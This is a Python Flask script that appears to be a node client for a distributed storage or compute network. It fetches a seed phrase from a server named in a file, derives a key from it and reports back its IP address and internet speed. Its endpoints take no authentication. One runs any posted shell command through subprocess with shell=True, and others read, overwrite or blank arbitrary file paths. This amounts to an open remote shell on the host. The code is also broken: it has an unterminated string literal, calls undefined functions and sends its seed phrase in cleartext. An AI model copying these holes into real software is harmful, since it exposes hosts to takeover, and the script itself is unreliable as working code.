from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import (
    encode_dss_signature,
    decode_dss_signature
)
import mnemonic
from mnemonic import Mnemonic
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.exceptions import InvalidSignature
from ecdsa import SigningKey, VerifyingKey
from ecdsa.curves import SECP256k1
import time
import pickle
import hashlib
import math
import socket
import requests
import base64
import copy
import random
from flask import Flask, request, jsonify
import threading
import subprocess

app = Flask(__name__)

def remove_newlines_and_spaces(text):
    return text.replace(" ", "").replace("\n", "")

def get_local_ip():
    # Get the local IP address of the computer
    return socket.gethostbyname(socket.gethostname())

@app.route("/addfile", methods=['POST'])
def addfile():
    data = request.json
    filename = data["filename"]
    filedata = data["filedata"]
    try:
        with open(filename, "w") as file:
            file.write(filedata)
    except:
        return jsonify({"Error": "Failed"}), 403
    return jsonify({"Success": "WE DID IT!"}), 200

@app.route("/deletefile", methods=['POST'])
def deletefile():
    data = request.json
    filename = data["filename"]
    try:
        with open(filename, "w") as file:
            file.write("")
    except:
        return jsonify({"Error": "Failed"}), 403
    return jsonify({"Success": "WE DID IT!"}), 200

@app.route("/getfile", methods=['POST'])
def getfile():
    data = request.json
    filename = data["filename"]
    try:
        with open(filename, "r") as file:
            filedata = file.read()
            return jsonify({"Success": filedata}), 200
    except:
        return jsonify({"Error": "File error"}), 403

@app.route("/executecommand", methods=['POST'])
def executecommand():
    data = request.json
    command = data["Command"]
    output = subprocess.check_output(command, shell=True, text=True)
    print(output)
    return jsonify({"Success": "WE DID IT!"}), 200

@app.route("/getinternetspeed", methods=['GET'])
def getinternetspeed():
    truethingything = True
    filepowerdata = ""
    try:
        with open("internetspeed.txt") as file:
            filepowerdata = file.read()
    except:
        print("ERROR")
        truethingything = False
    if truethingything:
        return jsonify({"Success": filepowerdata}), 200

@app.route("/gettheTOTALUSABLESTORAGE", methods=['POST'])
def gettheTOTALUSABLESTORAGE():
    DATASTORAGE = get_total_used_storage()
    return jsonify({"Success": DATASTORAGE})

@app.route("/gettheTOTALUSABLERAM", methods=['POST'])
def gettheTOTALUSABLERAM():
    DATASTORAGE = get_used_ram()
    return jsonify({"Success": DATASTORAGE})

trueproof = True
filedata = ""
try:
    with open("IP.txt", "r") as file:
        filedata = file.read()
except:
    trueproof = False

filedata = remove_newlines_and_spaces(filedata)
if trueproof:
    URLY = filedata + "/gettheselfkey"
    print("URLY: " + str(URLY))
    print("Len: " + str(len(URLY)))
    try:
        responsy = requests.get(URLY)
        if responsy.status_code == 200:
            data = responsy.json()
            data = data["Success"]
            seedphrase = data
    except:
        if URLY.find("/gettheselfkey") == -1:
            print("Sense")
        else:
            print("That makes no sense.")
        print("URL: " + str(URLY))

seed_phrase = seedphrase
seed_phrase = hashlib.sha256(seed_phrase.encode()).digest()

# Derive a cryptographic key from the seed phrase
salt = "22".encode('utf-8')
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
)
key = kdf.derive(seed_phrase)

private_key3333 = ec.derive_private_key(
    int.from_bytes(key, byteorder='big'),
    ec.SECP256R1(),
    backend=default_backend()
)

private_pem = private_key3333.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

public_key3333333 = private_key3333.public_key()
public_pem = public_key3333333.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

localipstring = str(get_local_ip())
message = localipstring
signature = private_key3333.sign(
    message.encode('utf-8'),
    ec.ECDSA(hashes.SHA256())
)
data = {"seedphrase": base64.b64encode(seed_phrase).decode('utf-8), "verifyingsig":base64.b64encode(signature).decode('utf-8'), "IPAddress": localipstring}

URLY = filedata + "/getthevalidatedIPADDRESS"
response = requests.post(url=URLY, json=data)

def loop1():
    while True:
        time.sleep(100)
        truepower = True
        filedatey = ""
        try:
            with open("internetspeed.txt", "r") as file:
                filedatey = file.read()
        except:
            truepower = False
        if truepower:
            signature = private_key3333.sign(
                message.encode('utf-8'),
                ec.ECDSA(hashes.SHA256())
            )
            URLY = filedata + "/checkplaceinternetspeed"
            stuffdata = {"seedphrase": seedphrase, "verifyingsig": base64.b64encode(signature).decode('utf-8'),"internespeed": filedatey}
            requests.post(URLY, json=stuffdata)

thread1 = threading.Thread(target=loop1)
thread1.start()

if __name__ == "__main__":
    local_ip = get_local_ip()
    app.run(host=local_ip, port=8002)

